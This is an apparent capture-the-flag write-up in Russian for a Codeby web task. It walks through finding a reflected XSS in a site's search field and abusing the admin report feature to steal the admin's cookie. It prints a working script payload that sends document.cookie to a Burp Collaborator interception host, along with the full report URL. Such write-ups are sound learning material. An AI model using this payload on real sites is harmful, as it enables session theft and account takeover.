# The customer is always right writeup
Указанная сложность таска - седний

Цена Таска - 500 

Для начала перидем по указанному нам ип-адресу
>***62.173.140.174: 16013***

И видим такой вот сайт 
![костюм](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/194481c8-f7e4-4522-adfb-52fcd829f0e0)

Функционал не велик. Давайте по порядку. Первое что можно селать - потыкать на ссылки, один нас вид к картинкам
![изображение](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/e5466b30-fb06-4970-8f9e-ca60029b9fe1)

![изображение](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/44b878dd-8f06-40ca-8f33-97f63bb4b44b)

![изображение](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/ae91119d-7281-41bc-a41c-b43d82cda7db)

Интересны картники, наверноэ, но нас так и не кнопка репора, ридом с каждылом.
![изображение](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/0e55828b-d9ad-4d66-811d-0f1e695254f1)

Репорт отправляется непосредственно админу, вспомним описание таска:
>***Какой-то админ ворует наши публикации и выставляет их на свой сайт. Ты ведь не будешь сидеть сложа руки?***

Скорее всего нам нужно получить доступ к админке, но как?
Название таска может подсказать нам, что тут прав клиент. Смотрим что такое XSS уязвимости.

Ну, хоть мы сразу может надеться на XSS уязвимость, было бы неплохо, проверить наши догадки.
введем в посик на сайте такую команду `<script>alert('1')</script>`
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/80d5ac94-a96f-4617-9265-a1c6b7945193)

Отлично! Наши догадки оказались верны, наша цель - перехватить куки. 
Сказать просто, надо делать. Единственное наше общение с админом происходит как раз во время репорта, а значит нам надо поддлеать репорт. 

Напишем пейлоад, который исполнит наш js скрипт, но у админа.

```
search=<script>document.location='http://{{ссылка перехвата}}//?c='%252bencodeURIComponent(document.cookie)</script>
```
Давайте разберу его. Мы используем факт того, что репорт можно отправить через search, значит мы будем искать наш пейлоад. 

Я не говорил про Burp Suite? Возможно самое время, для перехвата нам понадобиться Burp Suite Pro, способ получения не важен.

Если быть точнее, то нам нужна вкладка **Collaborator**
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/c470720f-2fd2-428f-86f8-22e57cf4a09e)

Нажимаем на кномпку **Copy clipboard**, то что мы скопировали вставляем в нам скрипт, я указ место для вставки как *ссылка перехвата*

Полная конечная наша ссылка должна выглядеть так:
```
http://62.173.140.174:16013/?report=http://62.173.140.174:16013/?search=<script>document.location='http://{{ссылка перехвата}}//?c='%252bencodeURIComponent(document.cookie)</script>
```

Вводим в поисковую строку ииии.... мы ничего не видим, зато это увидел админ. А мы возвращаемся в Burp и нажимаем **pull now**
![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/8495a001-6278-48a1-a4a7-0751d4c75f39)

Перехват успешен!

А вот и наш флаг

![image](https://github.com/BlankGODDAMN/codeby_writeup/assets/162637113/6681068f-6883-4dd9-af6a-69a80136771e)

Конец.
